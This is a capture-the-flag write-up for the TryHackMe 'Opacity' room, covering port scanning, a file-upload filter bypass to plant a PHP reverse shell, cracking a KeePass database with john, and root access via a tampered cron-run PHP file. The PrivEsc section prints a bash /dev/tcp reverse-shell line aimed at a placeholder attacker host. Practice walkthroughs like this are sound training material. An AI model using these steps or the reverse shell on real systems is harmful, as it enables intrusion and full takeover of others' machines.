---
title: THM Opacity
author: hanhctf
date: 2023-04-14 12:22:22 +0700
categories: [Write-up, THM]
tags: [php, file upload, keepass]
toc: true
mermaid: true
---

# [**_Opacity room_**](https://tryhackme.com/room/opacity)

## Nmap

With rustscan we can see 4 ports 22,80,139,445 are open

```shell
NMAP
PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0fee2910d98e8c53e64de3670c6ebee3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCa4rFv9bD2hlJ8EgxU6clOj6v7GMUIjfAr7fzckrKGPnvxQA3ikvRKouMMUiYThvvfM7gOORL5sicN3qHS8cmRsLFjQVGyNL6/nb+MyfUJlUYk4WGJYXekoP5CLhwGqH/yKDXzdm1g8LR6afYw8fSehE7FM9AvXMXqvj+/WoC209pWu/s5uy31nBDYYfRP8VG3YEJqMTBgYQIk1RD+Q6qZya1RQDnQx6qLy1jkbrgRU9mnfhizLVsqZyXuoEYdnpGn9ogXi5A0McDmJF3hh0p01+KF2/+GbKjJrGNylgYtU1/W+WAoFSPE41VF7NSXbDRba0WIH5RmS0MDDFTy9tbKB33sG9Ct6bHbpZCFnxBi3toM3oBKYVDfbpbDJr9/zEI1R9ToU7t+RH6V0zrljb/cONTQCANYxESHWVD+zH/yZGO4RwDCou/ytSYCrnjZ6jHjJ9TWVkRpVjR7VAV8BnsS6egCYBOJqybxW2moY86PJLBVkd6r7x4nm19yX4AQPm8=
|   256 9542cdfc712799392d0049ad1be4cf0e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAqe7rEbmvlsedJwYaZCIdligUJewXWs8mOjEKjVrrY/28XqW/RMZ12+4wJRL3mTaVJ/ftI6Tu9uMbgHs21itQQ=
|   256 edfe9c94ca9c086ff25ca6cf4d3c8e5b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINQSFcnxA8EchrkX6O0RPMOjIUZyyyQT9fM4z4DdCZyA
80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Login
|_Requested resource was login.php
139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 0s
| nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   OPACITY<00>          Flags: <unique><active>
|   OPACITY<03>          Flags: <unique><active>
|   OPACITY<20>          Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 13412/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 18707/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 36252/udp): CLEAN (Failed to receive data)
|   Check 4 (port 51793/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2023-04-11T09:30:50
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr 11 05:30:55 2023 -- 1 IP address (1 host up) scanned in 31.55 seconds
```

## Foothold

Dirsearch  
With dirsearch, we found some interesting

```shell  
[03:24:56] 301 -  314B  - /cloud  ->  http://10.10.230.185/cloud/           
[03:24:56] 200 -  639B  - /cloud/                                           
[03:25:02] 301 -  312B  - /css  ->  http://10.10.230.185/css/               
[03:25:19] 302 -    0B  - /index.php  ->  login.php                         
[03:25:19] 302 -    0B  - /index.php/login/  ->  login.php                  
[03:25:25] 200 -  848B  - /login.php                                        
[03:25:26] 302 -    0B  - /logout.php  ->  login.php 
```

`http://10.10.230.185/cloud/` → File upload

***after try many times ⇒ we ca upload a revershell .php with append extension #.png***

![](/commons/THM/Opacity2/1.got_rev_shell.png)

After enum with **www-data**

Found keepass data file save in **/opt**

1. Download file to local machine.
2. User keepass2john > hash
3. crack hash with john and rockyou.txt
4. open keepass data file with kpcli:

![](/commons/THM/Opacity2/2.sysadmin_cred.png)

**Got the local.txt**

## PrivEsc

SSH with sysadmin cred.

use pspy ⇒ cronjob

replace /lib/backup.inc.php with file bellow:  

```php
<?php


ini_set('max_execution_time', 600);
ini_set('memory_limit', '1024M');


function zipData($source, $destination) {
    system("bash -c 'bash -i >& /dev/tcp/attacker_IP/port 0>&1'");
}
?>
```  

Listen on port 4444 and

![](/commons/THM/Opacity2/3.root.png)

**Got root.txt**
